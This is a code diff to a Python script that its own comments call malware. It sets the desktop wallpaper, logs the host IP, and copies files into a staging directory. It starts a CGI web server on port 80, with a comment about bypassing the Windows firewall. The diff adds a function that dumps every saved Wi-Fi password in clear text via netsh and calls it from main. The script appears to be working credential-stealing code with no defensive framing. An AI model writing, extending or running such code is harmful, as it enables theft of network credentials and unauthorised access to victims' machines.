@@ -19,6 +19,7 @@ def background():
     #SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/WindowsLogs/veer.png", 0)
 
+#grabs the computer name and IP Address for the PC
 def ip_address():
     hostname = socket.gethostname()
     IPAddr = socket.gethostbyname(hostname)
@@ -27,10 +28,13 @@ def ip_address():
     print("Your attacking Computer IP Address is:" + IPAddr, file=f)
     f.close()    
 
+#copies files
+#need to include logic to check if file already exists
 def copy_file(source,target):
     shutil.copytree(source, target)
     print("files copied")
     
+#creates directory to store malware data
 def dir_create():
     #mode 0o777 allows for permissions to RWE
     if not os.path.isdir(dir_path):
@@ -38,11 +42,27 @@ def dir_create():
     else:
         print('The directory is present.')
         
+#spins up a server on port 80
+#windows firewall catches this action, which we need to bypass
 def run_server():
     from http.server import HTTPServer, CGIHTTPRequestHandler
     os.chdir('.')
     server_object = HTTPServer(server_address=('0.0.0.0', 80), RequestHandlerClass=CGIHTTPRequestHandler)
     server_object.serve_forever()
+    
+#grabs credentials of any connected wifi networks
+def wifi_creds():
+    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+    f = open("C:/WindowsLogs/WiFi.txt", "a")
+    for i in profiles:
+        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
+        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+        try:
+            print ("{:<30}|  {:<}".format(i, results[0]), file=f)
+        except IndexError:
+            print ("{:<30}|  {:<}".format(i, ""),file=f)
+    f.close()
 
 def main():
     dir_create()
@@ -51,6 +71,7 @@ def main():
     print("Wallpaper successfully applied")
     ip_address()
     copy_file("C:/WindowsLogs/","C:/test/")
+    wifi_creds()
     run_server()
     
 
